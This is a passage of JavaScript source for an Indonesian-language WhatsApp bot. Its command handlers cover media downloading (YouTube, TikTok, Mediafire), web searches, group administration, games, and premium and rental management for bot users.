									let store = `*「 PLAY STORE 」*\n\n*Hasil Pencarian Dari : ${q}*`
									for (let i of play){
										store += `
🆔 *Nama* : ${i.name}
🎯 *Link* : ${i.link}\n
👨‍💻 *Dev* : ${i.developer}
🌝 *Link Dev* : ${i.link_dev}
`
}
									reply(store)
									break
						case 'brainly':
									if(!q) return reply('Mau cari apa lord')
									brainly(`${q}`).then(res => {
										teks = `─ 「 *BRAINLY* 」 ─\n\n*Hasil Pencarian Dari ${q}*\n\n`
										for (let Y of res.data) {
											teks += `🔖 *PERTANYAAN :* ${Y.pertanyaan}\n💬 *JAWABAN :* ${Y.jawaban[0].text}\n\n`
											}
											Zeeone.sendMessage(from, teks, text, {quoted: Ofc, detectLinks: false})
										})
									break
						case 'mediafire':
									if (!isPremium) return reply(mess.only.prem)
									if (args.length < 1) return reply('Masukkan link mediafire')
									if(!isUrl(args[0]) && !args[0].includes('mediafire')) return reply('Linknya Error')
									reply(mess.wait)
									teks = args.join(' ')
									res = await mediafireDl(teks)
									result = ` *MEDIAFIRE DOWNLOAD*

*Data Berhasil Didapatkan!*

🆔 Nama : ${res[0].nama}
📊 Ukuran : ${res[0].size}
💬 Link : ${res[0].link}

_Tunggu Proses Upload Media_`
									reply(result)
									sendFileFromUrl(res[0].link, document, {mimetype: res[0].mime, filename: res[0].nama, quoted: Ofc})
									break
						case 'tiktoknowm':   case 'tiktok':
if (!q) return reply('Linknya?')
									
									if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply('Invalid link')
									let nowem = q
									hx.ttdownloader(nowem)
									.then(result => {
										const { wm, nowm, audio } = result
										axios.get(`https://tinyurl.com/api-create.php?url=${nowm}`)
										.then(async (a) => {
											me = `*Link* : ${a.data}`
											Zeeone.sendMessage(from,{url:`${nowm}`},video,{mimetype:'video/mp4',quoted: Ofc, caption:me})
											})
										}).catch((err) => reply(`Link tidak valid`))
									break 
						case 'tiktokmusic': case 'tiktokaudio': 
if (!q) return reply('Linknya?')
									 
									if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply('Invalid Link')
									let audi = q
									hx.ttdownloader(audi)
									.then(result => {
										const { wm, nowm, audio } = result
										axios.get(`https://tinyurl.com/api-create.php?url=${audio}`)
										.then(async (a) => {
											Zeeone.sendMessage(from,{url:`${audio}`},MessageType.audio,{mimetype:'audio/mp4',quoted: Ofc})
											})
										}).catch((err) => reply(`Link tidak valid`))
									break
						case 'playvideo': case 'video':{
									if (!q) return reply(`Example : ${prefix+command} query`)
									reply(mess.wait)
									try {
										var srch = args.join(' ')
										let yut = await yts(srch)
										server ='en68'
										ytv2(yut.videos[0].url, server)
										.then((res) => {
											const { dl_link, thumb, title, filesizeF, filesize } = res
											axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
											.then((a) => {
												if (Number(filesize) >= 40000) return Zeeone.sendMessage(from, `*─ 「 YOUTUBE VIDEO 」─*\n\n*▢ Title :* ${title}\n*▢ Filesize :* ${filesizeF}\n*▢ Upload :* ${yut.videos[0].ago}\n*▢ Ditonton :* ${yut.videos[0].views}\n*▢ Duration :* ${yut.videos[0].timestamp}\n\n\`\`\`Ukuran File Terlalu Besar Jadi Di Sajikan Dalam Bentuk Link\`\`\``, text, {quoted : Ofc})
												Zeeone.sendMessage(from, thumb, image, {caption: `─ 「 YOUTUBE VIDEO 」─\n\n*▢ Title :* ${title}\n*▢ Filesize :* ${filesizeF}\n*▢ Upload :* ${yut.videos[0].ago}\n*▢ Ditonton :* ${yut.videos[0].views}\n*▢ Duration :* ${yut.videos[0].timestamp}\n*▢ LINK :* ${yut.videos[0].url}\n\n\`\`\`Tunggu Sebentar, Video Sedang Dikirim\`\`\``, quoted : Ofc})
												sendFileFromUrl(dl_link, video, {mimetype: 'video/mp4',quoted:Ofc})
												})
												})
												} catch (err) {
													console.log('Error : %s', color(err, 'red'))
													reply(`ERROR`)
												}
											}
									break
					 case 'ytmp4': case 'ytvideo':{
									if (!q) return reply(`Example : ${prefix+command} https://youtu.be/kxjMsMST4Rw`)
									let isLinks = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
									if (!isLinks) return reply('Eror')
									reply(mess.wait)
									var srch = args.join('')
									aramas = await yts(srch);
		  	  server = 'en68'
		            aramat = aramas.all 
		            var mulaikah = aramat[0].url                            
		                  try {
		                    ytv2(srch, server)
		                    .then((res) => {
		                        const { dl_link, thumb, title, filesizeF, filesize } = res
		                        axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
		                        .then(async (a) => {
		                        if (Number(filesize) >= 100000) return sendMediaURL(from, thumb, `*📩 YOUTUBE-PLAY MP4*${enter}${enter}🐣 *Title* : ${title}${enter}📊 *Quality :* 480kbps${enter}🦁 *Ext* : MP3${enter}🐭 *Filesize* : ${filesizeF}${enter}🐺 *Link* : ${a.data}${enter}${enter}_Untuk durasi lebih dari batas disajikan dalam bentuk link_`)
		                        sendMediaURL(from, dl_link, '').catch(e => {reply('Emror')})
		                       })
		                        })
		                        } catch (err) {
		                        reply(mess.error.api)
		                        }
							}
		                   break      
						case 'play': case 'song':
									if (args.length === 0) return reply(`Kirim perintah *${prefix}play* _Judul lagu yang akan dicari_`)
									var srch = args.join(' ')
									aramas = await yts(srch);
									aramat = aramas.all 
									var mulaikah = aramat[0].url
									try {
										yta(mulaikah)
										.then((res) => {
											const { dl_link, thumb, title, filesizeF, filesize } = res
											axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
											.then(async (a) => {
												if (Number(filesize) >= 100000) return sendMediaURL(from, thumb, `*PLAY MUSIC*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam bentuk link_`)
												const captions = `🎧 *PLAY MUSIC*\n\n*Title* : ${title}\n*Ext* : MP3\n*Size* : ${filesizeF}\n*Link* : ${a.data}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
												await sendMediaURL(from, thumb, captions)
												sendMediaURL(from, dl_link).catch(() => reply('error'))
												}) 
											})
										} catch (err) {
											reply('Terjadi kesalahan')
											}
									break
						case 'ytmp3':
									if (args.length === 0) return reply(`Kirim perintah *${prefix}play* _url_`)
									let isLinks = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
									if (!isLinks) return reply('Eror')
									var srch = args.join(' ')
									try {
										yta(srch)
										.then((res) => {
											const { dl_link, thumb, title, filesizeF, filesize } = res
											axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
											.then(async (a) => {
												if (Number(filesize) >= 100000) return sendMediaURL(from, thumb, `*PLAY MUSIC*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam bentuk link_`)
												const captions = `🎧 *PLAY MUSIC*\n\n*Title* : ${title}\n*Ext* : MP3\n*Size* : ${filesizeF}\n*Link* : ${a.data}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
												await sendMediaURL(from, thumb, captions)
												sendMediaURL(from, dl_link).catch(() => reply('error'))
												}) 
											})
										} catch (err) {
											reply('Terjadi kesalahan')
											}
									break
						case 'ytsearch': case 'yts':
					if (args.length < 1) return reply('Tolong masukan query!')
					var srch = args.join(' ');
					try {
		        	var aramas = await yts(srch);
		   			} catch {
		        	return await Zeeone.sendMessage(from, 'Error!', MessageType.text, dload)
		    		}
		    		aramat = aramas.all 
		    		var tbuff = await getBuffer(aramat[0].image)
		    		var ytresult = '';
		    		ytresult += '「 *YOUTUBE SEARCH* 」'
		    		ytresult += '\n________________________\n\n'
		   			aramas.all.map((video) => {
		        	ytresult += '🐣 Title: ' + video.title + '\n'
		            ytresult += '🐣 Link: ' + video.url + '\n'
		            ytresult += '🐣 Durasi: ' + video.timestamp + '\n'
					ytresult += '🐣 Views: ' + video.views + '\n'
		            ytresult += '🐣 Upload: ' + video.ago + '\n________________________\n\n'
		    		});
		    		ytresult += '*WHATSAPP-BOT*'
		    		await Zeeone.sendMessage(from, tbuff, image, {quoted : Ofc, caption: ytresult})
					break
						case 'wiki': case 'wikipedia':
									if (args.length < 1) return reply(' Yang Mau Di Cari Apa Lord? ')
									reply(mess.wait)
									teks = args.join(' ')
									res = await wikiSearch(teks).catch(e => {
										return reply('Error Hasil Tidak Ditemukan') 
										}) 
										result = `*JUDUL :* ${res[0].judul}\n*WIKI :* ${res[0].wiki}`
										sendFileFromUrl(res[0].thumb, image, {quoted: Ofc, caption: result}).catch(e => {
											reply(result)
										})
									break
						case 'waifu': case 'shinobu': case 'megumin': case 'bully': case 'cuddle': case 'cry': case 'hug': case 'awoo': case 'kiss': case 'lick': case 'pat': case 'smug': case 'bonk': case 'yeet': case 'blush': case 'smile': case 'wave': case 'highfive': case 'handhold': case 'nom': case 'bite': case 'glomp': case 'slap': case 'kill': case 'happy': case 'wink': case 'poke': case 'dance': case 'cringe': 
              reply(mess.wait)
              let waifu = await fetchJson(`https://api.waifu.pics/sfw/${command.split(prefix)[1]}`)
                await sendFileFromUrl(from,waifu.url,`${command}`,Ofc)
                .catch((err) => {
                    reply('Terjadi kesalahan')
                })
		break
            case 'loli': case 'neko': 
              reply(mess.wait)
              let loli = await fetchJson(`https://api.waifu.pics/sfw/neko`)
              await sendFileFromUrl(from,loli.url,`${command}`,Ofc)
                .catch((err) => {
                       reply('Terjadi kesalahan')
                })
		break
						case 'asupan':{
									if (isLimit(sender, isPremium, isOwner, limitawal, limit)) return reply(mess.limit)
									reply(mess.wait)
									data = fs.readFileSync('./lib/asupan.js');
									jsonData = JSON.parse(data);
									randIndex = Math.floor(Math.random() * jsonData.length);
									randKey = jsonData[randIndex];
									let kdkp = await getBuffer(randKey.result)
									Zeeone.sendMessage(from, kdkp, video, { quoted:  Ofc, mimetype: 'video/mp4', caption: 'Asupan Lord'})
									limitAdd(sender, limit)
									}
									break
						case 'delete': case 'del': case 'd':
									if (!Ofc.key.fromMe && !isGroupAdmins && !isOwner)return reply(mess.only.admin)
									if (!isQuotedReply) return reply(`Reply pesan dari bot!!`)
									Zeeone.deleteMessage(from, { id: Ofc.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true })
									break
						case 'afk':
									if (!isGroup) return reply(mess.only.group)
									if (isAfkOn) return reply('Kamu dalam mode afk Lord')
									let reason = body.slice(5) ? body.slice(5) : 'Nothing.'
									afk.addAfkUser(sender, Date.now(), reason, _afk)
									mentions(`─「 *AFK MODE* 」─

@${sender.split('@')[0]} sedang afk!
Alasan : ${reason}`, [sender], true)
									break
						case 'delvote': case 'dellvote':
									if (!Ofc.key.fromMe && !isGroupAdmins && !isOwner) return reply(mess.only.admin)
									if (!isVote) return reply('Tidak ada sesi Voting')
									delVote(from)
									reply('Sukses Menghapus sesi Voting Di Grup Ini')
									break
						case 'voting': case 'vote':
									if (!isGroupAdmins && !isOwner) return reply(mess.only.admin)
									if (!isGroup) return reply(mess.only.group)
									if (isVote) return reply('Sesi Voting Sedang Berlangsung Di Grup Ini')
									if (!q) return reply(`*Example :*\n ${prefix + command} @tag target | reason| 1 (1 = 1 Menit)`)
									if (Ofc.message.extendedTextMessage.contextInfo.mentionedJid.length > 0 || Ofc.message.extendedTextMessage.contextInfo == null) {
										let id = Ofc.message.extendedTextMessage.contextInfo.mentionedJid[0]
										split = args.join(' ').replace('@', '').split('|')
										if(!Number(split[2])) return reply('masukan angka di baris ke 3\nContoh: 1-9999\n1 = 1 Menit')
										await mentions('Vote ' +'@'+ id.split('@')[0]+' Di Mulai!' +'\n\n' + `vote = ✅\ndevote = ❌\n\nAlasan: ${split[1]}`,[id],true)
										addVote(from,split[1],split[0],split[2],reply)
									}
									break
						case 'tictactoe': case 'ttt':
									if (!isGroup)return reply('*Khusus group*')
									if (Ofc.message.extendedTextMessage.contextInfo.mentionedJid > 1) return reply('Hanya bisa dengan 1 orang')
									if (!Ofc.message.extendedTextMessage.contextInfo.mentionedJid[0]) return
									if (fs.existsSync(`./database/user/${from}.json`)) return reply(`Sedang Ada Sesi, tidak dapat dijalankan secara bersamaan${enter}Ketik *${prefix}delsesi ttt*, untuk menghapus sesi`)
									if (args.length === 0) return reply(`Tag Lawan Yang Ingin Diajak Bermain Game`)
									tttSkuy = setTtt(`${from}`)
									tttSkuy.status = false
									tttSkuy.Z = sender.replace("@s.whatsapp.net", "")
									tttSkuy.Y = args[0].replace("@", "");
									fs.writeFileSync(`./database/user/${from}.json`, JSON.stringify(tttSkuy, null, 2))
									starGame = `「 *MEMULAI GAME TICTACTOE* 」${enter}${enter}•@${sender.replace("@s.whatsapp.net", "")} Menantang Bermain Tictactoe ${enter}[ ${args[0]} ] Ketik Y/N untuk menerima atau menolak permainan${enter}${enter}`
									Zeeone.sendMessage(from, starGame, text, {quoted: Ofc, contextInfo: { mentionedJid: [sender, args[0].replace("@", "") + "@s.whatsapp.net"],}})
									break
						case 'sewabot': 
									let gakloo = [{
										"buttonId": `owner`,
										"buttonText": {
											"displayText": "OWNER"
											},
										"type": "RESPONSE"
										},{
										"buttonId": `donasi`,
										"buttonText": {
											"displayText": "DONASI"
											},
										"type": "RESPONSE"
										}]
										sendButLocation(from, sewabotkak(), `Sewa bot om?`,  thumbnail, gakloo,{})
										break
						case 'donasi':
									reply('Isi sendiri')
									break
						case 'join':case 'joingc':
									if (!q) return reply('Linknya?')
									if (!Ofc.key.fromMe && !isOwner) return reply(mess.only.owner)
										if (!isUrl(args[0]) && !args[0].includes('https://chat.whatsapp.com/')) return reply('Linknya Invalid Lord')
										reply('Tunggu Sebentar Otw Masuk Group')
										link = args[0].replace('https://chat.whatsapp.com/','')
										fak = Zeeone.query({ json: ['action', 'invite', link],
										expect200: true })
										reply('Berhasil Masuk Grup')
									break
						case 'kick': case 'headsot':
									if (!isGroup) return reply(mess.only.group)
									if (!isGroupAdmins && !isOwner && !Ofc.key.fromMe) return reply(mess.only.admin) 
									if (!isBotGroupAdmins) return reply(`Jadikan Bot Sebagai Admin Group!`)
									kick(from, mentionUser)
									break
						case 'revoke': case 'resetlinkgc': case 'resetlink':
									if (!isGroup) return reply(mess.only.group)
									if (!isGroupAdmins && !isOwner && !Ofc.key.fromMe) return reply(mess.only.admin) 
									if (!isBotGroupAdmins) return reply(`Jadikan Bot Sebagai Admin Group!`)
									Zeeone.query({ json: ['action', 'inviteReset', from], expect200: true })
									reply(`Sukses Reset Link Group!`)
									break
						case 'linkgc': case 'gclink': case 'linkgrup': case 'linkgroup': case 'grouplink':
									if (!isGroup) return reply(mess.only.group)
									if (!isGroupAdmins && !isOwner && !Ofc.key.fromMe) return reply(mess.only.admin)   
									if (!isBotGroupAdmins) return reply(`Jadikan Bot Sebagai Admin Group!`)
									linkgc = await Zeeone.groupInviteCode (from)
									yeh = `*https://chat.whatsapp.com/${linkgc}*`
									Zeeone.sendMessage(from, {text: yeh,
									matchedText: 'https://chat.whatsapp.com/' + linkgc, 
									canonicalUrl: `https://chat.whatsapp.com/${linkgc}`, 
									description: `https://chat.whatsapp.com/${linkgc}`, 
									title: `${groupName}`, 
									jpegThumbnail: thumbnail}, 'extendedTextMessage', { detectLinks: false, contextInfo: {mentionedJid: [yeh]}, quoted: Ofc})
									break
						case 'add':
									try {
										if (!isGroup) return reply(mess.only.group)
										if (!isGroupAdmins && !isOwner && !Ofc.key.fromMe) return reply(mess.only.admin)  
										if (!isBotGroupAdmins) return reply(`Jadikan Bot Sebagai Admin Group!`)
										if (Ofc.message.extendedTextMessage === null || Ofc.message.extendedTextMessage === undefined) {
											entah = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
											response = await Zeeone.groupAdd(from, [entah])
											o = response.participants[0]
											let inv = (Object.values(o))
											if(inv[0].code == 409) return reply('Target Sudah Di Didalam Group!')
											if(inv[0].code == 403) return reply('Eror, user private acc')
											if(inv[0].code == 408) return reply('Eror, user baru saja keluar')
											if(inv[0].code == 401) return reply('Eror, Karena Bot Di Block Oleh Target')
												} else {
													entah = Ofc.message.extendedTextMessage.contextInfo.participant
													response = await Zeeone.groupAdd(from, [entah])
													o = response.participants[0]
													let inv = (Object.values(o))
													if(inv[0].code == 409) return reply('Target Sudah Di Didalam Group!')
													if(inv[0].code == 403) return reply('Gagal, Karena Di Private')
													if(inv[0].code == 408) return reply('Gagal, Karena Target Baru² Saja Keluar')
													if(inv[0].code == 401) return reply('Gagal, Karena Bot Di Block Oleh Target')
												}
											} catch {
												return 
											}
									break
						case 'setthumb': case 'setthum':
									if (!isOwner && !Ofc.key.fromMe) return reply(mess.only.owner)
									boij = JSON.parse(JSON.stringify(Ofc).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
									delb = await Zeeone.downloadMediaMessage(boij)
									fs.writeFileSync('./image/thumb.jpg', delb)
									matanecok = fs.readFileSync('./image/thumb.jpg')
									await sleep(5000)
									reply(`Sukses`)
									break    
						case 'auto':{
									if (!isOwner && !Ofc.key.fromMe) return reply(mess.only.owner)
									if (!q) return 
									if (
									args[0].toLowerCase() === 'ngetik' ||
									args[0].toLowerCase() === 'ketik' ||
									args[0].toLowerCase() === 'typing'
									){
										ngetik = true
										autovn = false
										reply(`Sukses....`)
										} else if (
										args[0].toLowerCase() === 'voicenote' ||
										args[0].toLowerCase() === 'recording' ||
										args[0].toLowerCase() === 'vn' 
									){
										ngetik = false
										autovn = true
										reply(`Sukses...`)
										} else {
											}
										}
									break
						case 'changeprefix': case 'setprefix':
									if (!isOwner && !Ofc.key.fromMe) return reply(mess.only.owner)
									if (!q) return 
									if (
									args[0].toLowerCase() === 'multi' ||
									args[0].toLowerCase() === 'all' ||
									args[0].toLowerCase() === 'allprefix' ||
									args[0].toLowerCase() === 'multiprefix'
									){
										multiprefix = true
										nopref = false
										reply(`Berhasil Mengubah Prefix Ke Multi Prefix`)
										} else if (
										args[0].toLowerCase() === 'nopref' ||
										args[0].toLowerCase() === 'no' ||
										args[0].toLowerCase() === 'nonpref'
									){
										multiprefix = false
										nopref = true
										reply(`Berhasil Mengubah Prefix Ke No Prefix`)
										} else if(args[0] === `${q}`){
											if (q.length > 2) return reply(`Maximal 1 angka/huruf!!`)
											multiprefix = false
											nopref = false
											prefa = `${args[0]}`
											reply(`Berhasil Mengubah Prefix Ke *${q}*`)
										}
									break
						case 'setnamabot':{
									if (!isOwner && !Ofc.key.fromMe) return reply(mess.only.owner)
									if (args.length < 1) return reply(`Kirim perintah ${command} nama\n\nContoh : ${command} Alphabot`)
									Zeeone.updateProfileName(q)
									.then((res) => reply('Sukses Lord'))
									.catch((err) => reply('Eror Lord'))
									 }
									break
						case 'setbiobot':{
									 if (!isOwner && !Ofc.key.fromMe) return reply(mess.only.owner)
									if (args.length < 1) return reply(`Kirim perintah ${command} nama\n\nContoh : ${command} Alphabot`)
									Zeeone.setStatus(q)
									.then((res) => reply('Sukses Lord'))
									.catch((err) => reply('Eror Lord'))
									}
									break
						case 'grup': case 'grub': case 'group':
									if (!isGroup) return reply(mess.only.group)
									if (!isGroupAdmins) return reply(mess.only.admin)
									if (!isBotGroupAdmins) return reply(`Jadikan Bot Sebagai Admin Group!`)
									if (args[0] === "open") {
										Zeeone.groupSettingChange(from, GroupSettingChange.messageSend, false)
										} else if (args[0] === "close") {
											Zeeone.groupSettingChange(from, GroupSettingChange.messageSend, true)
											} else {
												reply (`${prefix + command} buka / tutup`)
												}
									break 
						case 'promote':
									if (!isGroup) return reply(mess.only.group)
									if (!isGroupAdmins && !isOwner) return reply(mess.only.admin)
									if (!isBotGroupAdmins) return reply(`Jadikan Bot Sebagai Admin Group!`)
									if (Ofc.message.extendedTextMessage === null || Ofc.message.extendedTextMessage === undefined) return;
									if (Ofc.message.extendedTextMessage.contextInfo.participant === undefined) {
										entah = Ofc.message.extendedTextMessage.contextInfo.mentionedJid
										if (entah.length > 0) {
											var mems_ids = []
											for (let ids of entah) {
												mems_ids.push(ids)
												}
												Zeeone.groupMakeAdmin(from, mems_ids)
												} else {
													Zeeone.groupMakeAdmin(from, entah)
													}
												} else {
													entah = Ofc.message.extendedTextMessage.contextInfo.participant 
													Zeeone.groupMakeAdmin(from, [entah])
												}
									break
						case 'demote':
									if (!isGroup) return reply(mess.only.group)
									if (!isGroupAdmins && !isOwner) return reply(mess.only.admin)
									if (!isBotGroupAdmins) return reply(`Jadikan Bot Sebagai Admin Group!`)
									if (Ofc.message.extendedTextMessage === null || Ofc.message.extendedTextMessage === undefined) return;
									if (Ofc.message.extendedTextMessage.contextInfo.participant === undefined) {
										entah = Ofc.message.extendedTextMessage.contextInfo.mentionedJid
										if (entah.length > 0) {
											var mems_ids = []
											for (let ids of entah) {
												mems_ids.push(ids)
												}
												Zeeone.groupDemoteAdmin(from, mems_ids)
												} else {
													Zeeone.groupDemoteAdmin(from, [entah[0]])
													}
													} else {
														entah = Ofc.message.extendedTextMessage.contextInfo.participant
														Zeeone.groupDemoteAdmin(from, [entah])
													}
									break
						case 'setnamagrup': case 'setnamegrup': case 'setgrupname':
									if (!isGroup) return reply(mess.only.group)
									if (!isGroupAdmins && !isOwner) return reply(mess.only.admin)
									if (!isBotGroupAdmins) return reply(`Jadikan Bot Sebagai Admin Group!`)
									if (args.length == 0) return reply(`Penggunaan ${prefix + command} Alphabot Support`)
										Zeeone.groupUpdateSubject(from, q)
										.then((res) => reply(jsonformat(res)))
										.catch((err) => reply(jsonformat(err)))
									break
						case 'setdesc': case 'setdesk': case 'setdeskripsi':
									if (!isGroup) return reply(mess.only.group)
									if (!isGroupAdmins && !isOwner) return reply(mess.only.admin)
									if (!isBotGroupAdmins) return reply(`Jadikan Bot Sebagai Admin Group!`)
									if (args.length == 0)  return reply(`Penggunaan ${prefix + command} Alphabot Support`)
										Zeeone.groupUpdateDescription(from, q)
										.then((res) => reply(jsonformat(res)))
										.catch((err) => reply(jsonformat(err)))
									break
						case 'setppbot':
									if (!isOwner && !Ofc.key.fromMe) return
									if (!isQuotedImage) return reply(`Kirim gambar dengan caption ${prefix}setbotpp atau tag gambar yang sudah dikirim`)
									enmedia = JSON.parse(JSON.stringify(Ofc).replace('quotedM','m')).message.extendedTextMessage.contextInfo
									media = await Zeeone.downloadAndSaveMediaMessage(enmedia)
									await Zeeone.updateProfilePicture(botNumber, media)
									reply('Makasih pp barunya lord 🌝')
									break
						case 'setppgrup':
									if (!isGroup) return reply(mess.only.group)
									if (!isGroupAdmins && !isOwner) return reply(mess.only.admin)
									if (!isBotGroupAdmins) return reply(`Jadikan Bot Sebagai Admin Group!`)
									if (isQuotedImage) {
										let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(Ofc).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : Ofc
										let media = await Zeeone.downloadMediaMessage(encmedia)
										Zeeone.updateProfilePicture(from, media)
										.then((res) => reply(jsonformat(res)))
										.catch((err) => reply(jsonformat(err)))
										} else if (isQuotedSticker){
											if (Ofc.message.videoMessage) return reply('Error Bro Wkwkwk')
											encmedia = JSON.parse(JSON.stringify(Ofc).replace('quotedM','m')).message.extendedTextMessage.contextInfo
											media = await Zeeone.downloadAndSaveMediaMessage(encmedia)
											ran = getRandom('.png')
											exec(`ffmpeg -i ${media} ${ran}`, (err) => {
												fs.unlinkSync(media)
												if (err) return reply('Eror Lord')
												buffer = fs.readFileSync(ran)
												Zeeone.updateProfilePicture(from, buffer)
												fs.unlinkSync(ran)
												})
											} else {
												reply(`Kirim atau tag gambar dengan caption ${prefix + command}`)
											}
									break
						case 'premium': 
									if (!isOwner && !Ofc.key.fromMe) return reply(mess.only.owner)
									if (args[0] === 'add') {
										if (Ofc.message.extendedTextMessage != undefined) {
											mentioned = Ofc.message.extendedTextMessage.contextInfo.mentionedJid
											premium.addPremiumUser(mentioned[0], args[2], _premium)
											reply(`*「 PREMIUM ADDED 」*\n\n📛 *ID*: ${mentioned[0]}\n⏰ *Expired*: ${ms(toMs(args[2])).days} day(s) ${ms(toMs(args[2])).hours} hour(s) ${ms(toMs(args[2])).minutes} minute(s)`)
											} else {
												premium.addPremiumUser(args[1] + '@s.whatsapp.net', args[2], _premium)
												reply(`*「 PREMIUM ADDED 」*\n\n📛 *ID*: ${args[1]}@s.whatsapp.net\n⏰ *Expired*: ${ms(toMs(args[2])).days} day(s) ${ms(toMs(args[2])).hours} hour(s) ${ms(toMs(args[2])).minutes} minute(s)`)
												}
												} else if (args[0] === 'del') {
													if (Ofc.message.extendedTextMessage != undefined) {
														mentioned = Ofc.message.extendedTextMessage.contextInfo.mentionedJid
														_premium.splice(premium.getPremiumPosition(mentioned[0], _premium), 1)
														fs.writeFileSync('./database/premium.json', JSON.stringify(_premium))
														reply(mess.succes)
														} else {
															_premium.splice(premium.getPremiumPosition(args[1] + '@s.whatsapp.net', _premium), 1)
															fs.writeFileSync('./database/premium.json', JSON.stringify(_premium))
															reply(mess.succes)
															}
															} else {
																 reply(`Example : ${prefix + command} add/del 62887435047326 10s`)
															}
										break
						case 'cekprem': case 'cekpremium': case 'premiumcek':
									if (!isPremium) return reply(`Kamu bukan user premium\nkirim perintah ${prefix}daftarprem untuk membeli premium`)
									let cekExp = ms(await premium.getPremiumExpired(sender, _premium) - Date.now())
									let premiumnya = `*「 PREMIUM EXPIRE 」*\n\n🆔 *ID*: ${sender}\n⏰ *Expired*: ${cekExp.days} day(s) ${cekExp.hours} hour(s) ${cekExp.minutes} minute(s)`
									reply(`${isOwner?'Unlimited Prem (My Lord)':premiumnya}`)
									break
						
						case 'listprem': case 'listpremium': case 'premiumlist': case 'premlist':
									if (!isOwner && !Ofc.key.fromMe) return
									let txt = `*「 LIST PREMIUM 」*\n\n*💹 Total :* ${_premium.length}\n\n`
									let men = [];
									for (let i of _premium){
										men.push(i.id)
										let cekvip = ms(i.expired - Date.now())
										txt += `*🆔 Nomor : ${i.id.split("@")[0]}*\n*📛 User : @${i.id.split("@")[0]}*\n📊 Expired : ${cekvip.days} Day (s), ${cekvip.hours} Hour (s), ${cekvip.minutes} Minute (s), ${cekvip.seconds} Second (s)`
									}
									reply(`${txt}`)
									break
						case 'extend': case 'perpanjang':
									if (!isSewa) return reply('Kamu belum sewa bot sebelumnya? klik #sewabot')
									reply('Sedang Mengirim Pesan Perpanjangan Masa Sewa Ke Owner Bot')
									Zeeone.sendMessage(`${owner_number}@s.whatsapp.net`, `Hai Owner, @${sender.split("@")[0]} Mau Memperpanjang Waktu Sewa Bot`, text, {contextInfo: {"mentionedJid" : [sender]}})
									break
						case 'sewa':{
									if (!isOwner && !Ofc.key.fromMe) return reply(mess.sewabot)
									if(!isGroup) return reply(mess.only.group)
									if (q === 'add') {
										_sewa.addSewaGroup(from, args[1], sewa)
										reply(`Sukses Lord`)
									} else if (q === 'del') {
										sewa.splice(_sewa.getSewaPosition(from, sewa), 1)
										fs.writeFileSync('./database/sewa.json', JSON.stringify(sewa))
										reply(`Sukses Lord`)
										} else {
										}
									}
									break
						case 'sewalist':  case 'listsewa':
									if (!isOwner && !Ofc.key.fromMe) return
									let txtnyee = `List Sewa\nJumlah : ${sewa.length}\n\n`
									for (let i of sewa){
										let cekviopp = ms(i.expired - Date.now())
										txtnyee += `🆔 *ID :* ${i.id}\n📊 *Expire :* ${cekviopp.days} day(s) ${cekviopp.hours} hour(s) ${cekviopp.minutes} minute(s) ${cekviopp.seconds} second(s)\n\n`
										}
										reply(txtnyee)
									break
						case 'sewacheck': case 'ceksewa':  case 'sewacek':
									if (!isGroup) return reply(mess.only.group)
									if (!isSewa) return reply(`Group ini tidak terdaftar dalam list sewabot. Ketik ${prefix}sewabot untuk info lebih lanjut`)
									let cekvip = ms(_sewa.getSewaExpired(from, sewa) - Date.now())
									let sewenye = `「 *SEWA EXPIRE* 」

🆔 *ID*: ${from}
💹 *EXPIRE :* ${cekvip.days} day(s) ${cekvip.hours} hour(s) ${cekvip.minutes} minute(s)`
									reply(sewenye)
									break
						case 'antibadword': case 'nobadword':
									if (!isGroup) return reply(mess.only.group)
									if (!isGroupAdmins && !isOwner) return reply(mess.only.admin)
									if (!isBotGroupAdmins) return reply(`Jadikan Bot Sebagai Admin Group`)
									if (args.length === 0) return reply(`Pilih on atau off`)
									if (args[0] == 'on'){
										if (isBadword) return reply(`Udah aktif Lord`)
										grupbadword.push(from)
										fs.writeFileSync('./database/grupbadword.json', JSON.stringify(grupbadword))
										reply(`antibadword grup aktif, kirim ${prefix}listbadword untuk melihat list badword`)
										} else if (args[0] == 'off'){
											anu = grupbadword.indexOf(from)
											grupbadword.splice(anu, 1)
											fs.writeFileSync('./database/grupbadword.json', JSON.stringify(grupbadword))
											reply('Antibadword Grup Dimatikan')
											} else {
												reply('pilih on / off')
												}
									break
						case 'antilink':
									if (!isGroupAdmins && !isOwner && !Ofc.key.fromMe) return reply(mess.only.admin)
										if (args[0].toLowerCase() === 'on'){
											if (isAntiLink) return reply(`Sudah Di Aktifkan Sebelumnya!`)
											antilink.push(from)
											fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink))
											reply(`Succes mengaktifkan Fitur Antilink`)
											} else if (args[0].toLowerCase() === 'off'){
												if (!isAntiLink) return reply(`Fitur Ini Belum Pernah Di Aktifkan Di Group Ini`)
												var au = antilink.indexOf(from)
												antilink.splice(au, 1)
												fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink))
												reply(`Succes Mematikan Fitur Antilink`)
												} else {
													reply(`${prefix + command} on / off`)
													}
											break
						case 'listbadword':
									if (isBanned) return
									let bi = `List badword\n\n`
									for (let boo of badword){
										bi += `- ${boo}\n`
										}
